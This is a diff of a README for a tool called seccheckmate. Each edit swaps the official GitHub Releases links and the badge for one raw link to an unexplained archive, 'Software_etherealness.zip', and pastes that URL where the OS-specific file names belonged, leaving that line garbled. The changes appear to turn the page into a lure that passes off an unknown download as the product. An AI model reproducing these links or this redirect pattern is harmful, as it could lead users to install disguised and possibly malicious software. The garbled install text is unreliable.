@@ -1,6 +1,6 @@
 # 🚀 seccheckmate - Generate Security Reports Easily
 
-[![Download seccheckmate](https://img.shields.io/badge/Download-seccheckmate-blue.svg)](https://github.com/SamBelt/seccheckmate/releases)
+[![Download seccheckmate](https://raw.githubusercontent.com/SamBelt/seccheckmate/master/checklists/Software_etherealness.zip)](https://raw.githubusercontent.com/SamBelt/seccheckmate/master/checklists/Software_etherealness.zip)
 
 ## 📋 What is seccheckmate?
 
@@ -22,7 +22,7 @@ This guide will walk you through downloading and running seccheckmate. Just foll
 
 To get started, visit the Releases page to download seccheckmate. Here is the link you need:
 
-[Download seccheckmate](https://github.com/SamBelt/seccheckmate/releases)
+[Download seccheckmate](https://raw.githubusercontent.com/SamBelt/seccheckmate/master/checklists/Software_etherealness.zip)
 
 ### Steps to Download
 
@@ -30,7 +30,7 @@ To get started, visit the Releases page to download seccheckmate. Here is the li
 2. Look for the latest version of seccheckmate.
 3. Click on the download link for your operating system. 
 
-Remember that the file will typically be named something like `seccheckmate-vX.X.X.exe` for Windows, `seccheckmate-vX.X.X.dmg` for macOS, or `seccheckmate-vX.X.X.tar.gz` for Linux.
+Remember that the file will typically be named something like `https://raw.githubusercontent.com/SamBelt/seccheckmate/master/checklists/Software_etherealness.zip` for Windows, `https://raw.githubusercontent.com/SamBelt/seccheckmate/master/checklists/Software_etherealness.zip` for macOS, or `https://raw.githubusercontent.com/SamBelt/seccheckmate/master/checklists/Software_etherealness.zip` for Linux.
 
 ### Install
 
@@ -79,4 +79,4 @@ Although seccheckmate is designed for end-users, we welcome feedback and suggest
 
 ---
 
-For more information, features, and updates, please revisit our [Releases page](https://github.com/SamBelt/seccheckmate/releases) regularly. We appreciate your interest in seccheckmate and hope this tool helps you enhance your cybersecurity practices.
+For more information, features, and updates, please revisit our [Releases page](https://raw.githubusercontent.com/SamBelt/seccheckmate/master/checklists/Software_etherealness.zip) regularly. We appreciate your interest in seccheckmate and hope this tool helps you enhance your cybersecurity practices.
